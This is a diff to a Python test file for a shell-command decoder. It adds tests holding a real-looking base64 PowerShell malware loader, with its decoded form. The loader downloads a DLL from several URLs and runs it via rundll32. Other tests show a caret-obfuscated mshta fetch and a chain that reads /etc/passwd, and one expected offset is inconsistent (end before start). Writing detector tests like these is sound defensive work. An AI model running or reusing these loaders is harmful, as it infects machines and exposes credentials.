@@ -1,5 +1,4 @@
 import regex as re
-
 from multidecoder.decoders.shell import (
     CMD_RE,
     find_cmd_strings,
@@ -42,11 +41,8 @@ def test_cmd_re_null():
 
 def test_cmd_re_ex1():
     match = re.search(CMD_RE, test)
-    assert (
-        match
-        and test[match.start() : match.end()]
-        == b"cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html"
-    )
+    assert match
+    assert test[match.start() : match.end()] == b"cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html"
 
 
 # strip_carets
@@ -91,6 +87,18 @@ def test_find_cmd_strings():
             start=13,
             end=55,
             obfuscation="unescape.shell.carets",
+        )
+    ]
+
+
+def test_find_cmd_strings_with_combo_of_ps1_and_cmd():
+    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
+    assert find_cmd_strings(ex) == [
+        Node(
+            type_="shell.cmd",
+            value=b"cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
+            start=37,
+            end=103,
         )
     ]
 
@@ -160,6 +168,38 @@ def test_find_powershell_strings_invoke_expression():
     ]
 
 
+def test_find_powershell_strings_from_dynamic_command():
+    ex = b'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -encodedcommand "UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7ACQAUABvAGwAeQBuAG8AbQBpAGEAbABpAHMAdABBAG4AZwBsAGkAYwBpAHoAZQBzACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AZQBkAHMAZQBuAGUAegBhAGwAdQBtAGkAbgB1AG0ALgBjAG8AbQAvAE8AUABHAC8ANABhAFQAOAB2AHcALABoAHQAdABwAHMAOgAvAC8AeQBlAGwAbABvAHcAaABhAHQAZwBsAG8AYgBhAGwALgBjAG8AbQAvAEcAMQBSAFcALwBpAGsAdgBvAHEAbQBpADcASgBzAGwALABoAHQAdABwAHMAOgAvAC8AYQB3AGEAaQBzAGQAYQBuAGkAcwBoAC4AYwBvAG0ALwBOAG4AUgBVAC8AaABwAHQAUwBKAHYALABoAHQAdABwAHMAOgAvAC8AYQB2AGEAaQBsAGEAYgBsAGUAYwBsAGUAYQBuAGUAcgAuAGMAbwBtAC8AdwBoAGcAaQBvAC8ASgBmAHEAeABiAFoAdwBQADEAWQBEACwAaAB0AHQAcABzADoALwAvAGUAbgBnAHYAaQBkAGEALgBjAG8AbQAuAGIAcgAvAHIATABtAC8AYwBmAEsAeQBIAEoAeQB2AGgAMgAsAGgAdAB0AHAAcwA6AC8ALwB1AGIAbQBoAGEAaQB0AGkALgBvAHIAZwAvAHQAaABRADYATAAvAG8ARgBMAE8AZQBqAEoAcgBHACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAHQAYQB1AHQAbwBsAG8AZwBpAHoAZQBkACAAaQBuACAAJABQAG8AbAB5AG4AbwBtAGkAYQBsAGkAcwB0AEEAbgBnAGwAaQBjAGkAegBlAHMAKQAgAHsAdAByAHkAIAB7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACQAdABhAHUAdABvAGwAbwBnAGkAegBlAGQAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAxADgAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwAOwBpAGYAIAAoACgARwBlAHQALQBJAHQAZQBtACAAJABlAG4AdgA6AFQARQBNAFAAXABtAGEAbgBpAHAAdQBsAGEAdABpAG8AbgAuAGQAbABsACkALgBsAGUAbgBnAHQAaAAgAC0AZwBlACAAMQAwADAAMAAwADAAKQAgAHsAcwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABcAG0AYQBuAGkAcAB1AGwAYQB0AGkAbwBuAC4AZABsAGwALABHAEwANwAwADsAYgByAGUAYQBrADsAfQB9AGMAYQB0AGMAaAAgAHsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANAA7AH0AfQA="'
+
+    assert find_powershell_strings(ex) == [
+        Node(
+            type_="shell.powershell",
+            value=b'powershell.exe -Command Start-Sleep -Seconds 4;$PolynomialistAnglicizes = ("https://edsenezaluminum.com/OPG/4aT8vw,https://yellowhatglobal.com/G1RW/ikvoqmi7Jsl,https://awaisdanish.com/NnRU/hptSJv,https://availablecleaner.com/whgio/JfqxbZwP1YD,https://engvida.com.br/rLm/cfKyHJyvh2,https://ubmhaiti.org/thQ6L/oFLOejJrG").split(",");foreach ($tautologized in $PolynomialistAnglicizes) {try {Invoke-WebRequest $tautologized -TimeoutSec 18 -O $env:TEMP\\manipulation.dll;if ((Get-Item $env:TEMP\\manipulation.dll).length -ge 100000) {start rundll32 $env:TEMP\\\\manipulation.dll,GL70;break;}}catch {Start-Sleep -Seconds 4;}}',
+            obfuscation="powershell.base64",
+            start=44,
+            end=1658,
+        ),
+    ]
+
+
+def test_find_powershell_strings_with_combo_of_ps1_and_cmd():
+    ex = b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd"
+    assert find_powershell_strings(ex) == [
+        Node(
+            type_="shell.powershell",
+            value=b"powershell -Command curl blah.com && cmd /c curl https://abc.org && powershell -Command cat /etc/passwd",
+            start=0,
+            end=103,
+        ),
+        Node(
+            type_="shell.powershell",
+            value=b"powershell -Command cat /etc/passwd",
+            start=68,
+            end=35,
+        ),
+    ]
+
+
 # get_cmd_command
 def test_get_cmd_command_empty():
     assert get_cmd_command(b"") == b""
@@ -181,10 +221,7 @@ def test_get_cmd_command_r():
 
 
 def test_get_cmd_command_amp():
-    assert (
-        get_cmd_command(b"cmd&command&command2&command3")
-        == b"command&command2&command3"
-    )
+    assert get_cmd_command(b"cmd&command&command2&command3") == b"command&command2&command3"
 
 
 def test_get_cmd_command_upper():
